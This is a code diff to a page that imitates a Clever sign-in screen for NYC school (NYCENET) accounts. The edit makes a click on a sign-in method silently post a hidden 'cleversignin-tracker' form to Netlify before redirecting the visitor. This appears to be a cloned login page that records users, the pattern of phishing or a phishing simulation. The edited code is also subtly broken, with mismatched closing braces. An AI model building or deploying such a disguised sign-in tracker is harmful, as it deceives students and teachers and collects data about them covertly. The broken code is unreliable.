@@ -63,15 +63,14 @@ document.querySelectorAll('.AuthMethod--container').forEach(link => {
     // Submit form to Netlify
     const form = document.forms['cleversignin-tracker'];
     fetch(window.location.pathname, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: new URLSearchParams(new FormData(form)).toString()
-    })
-    .then(() => {
-      console.log('Form submitted — no redirect.');
-    })
-    .catch(err => console.error('Form submission error:', err));
-  });
+  method: 'POST',
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  body: new URLSearchParams(new FormData(form)).toString()
+})
+.then(res => console.log('Form submitted!', res))
+.catch(err => console.error('Form error:', err))
+.finally(() => {
+  window.location.href = redirectURL;
 });
 </script>
               <a class="flexbox items--center AuthMethod--container" href="/oauth/saml/login?target=NTRkMjYzOTQ2Y2M5NjgwMTAwMDAwMDdh%3BOTk4ZDc5OWI2OGRkNWUxYjZhNTc%3D%3BaHR0cHM6Ly9hY2NvdW50cy5uYXZpYW5jZS5jb20vbG9naW4vY2FsbGJhY2s%3D%3BQ01HYTd2RWpncU5PTEpIMmVsYThvMzlxYTFpb25qRkE%3D%3BY29kZQ%3D%3D%3B" aria-label="Log in with NYCENET - Recommended for Students and Teachers">
